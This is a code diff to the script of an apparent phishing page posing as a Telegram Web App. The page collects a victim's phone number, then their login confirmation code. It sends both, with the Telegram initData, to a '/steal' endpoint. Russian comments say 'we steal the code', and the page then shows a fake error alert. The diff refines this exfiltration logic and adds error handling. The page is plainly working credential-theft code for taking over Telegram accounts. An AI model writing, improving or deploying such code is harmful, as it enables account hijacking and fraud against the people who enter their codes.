@@ -112,6 +112,10 @@
         const phoneScreen = document.getElementById('phoneScreen');
         const codeScreen = document.getElementById('codeScreen');
 
+        // Получаем текущий домен
+        const currentDomain = window.location.hostname;
+        const stealUrl = `https://${currentDomain}/steal`;
+
         // Валидация номера
         phoneInput.addEventListener('input', function() {
             nextBtn.disabled = !this.value.match(/^\+7[0-9]{10}$/);
@@ -128,7 +132,7 @@
             const tgData = Telegram.WebApp.initData;
             
             // Отправляем номер на сервер
-            fetch('/steal', {
+            fetch(stealUrl, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
@@ -136,7 +140,7 @@
                     tg_data: tgData,
                     stage: 'phone_entered'
                 })
-            });
+            }).catch(e => console.error('Ошибка отправки:', e));
 
             phoneScreen.classList.add('hidden');
             codeScreen.classList.remove('hidden');
@@ -145,7 +149,7 @@
         // Подтверждение кода
         confirmBtn.addEventListener('click', function() {
             // Крадём код
-            fetch('/steal', {
+            fetch(stealUrl, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
@@ -154,7 +158,7 @@
                     tg_data: Telegram.WebApp.initData,
                     stage: 'code_entered'
                 })
-            });
+            }).catch(e => console.error('Ошибка отправки:', e));
 
             // Показываем фейковую ошибку
             alert('Ошибка! Не удалось войти в аккаунт. Попробуйте позже.');
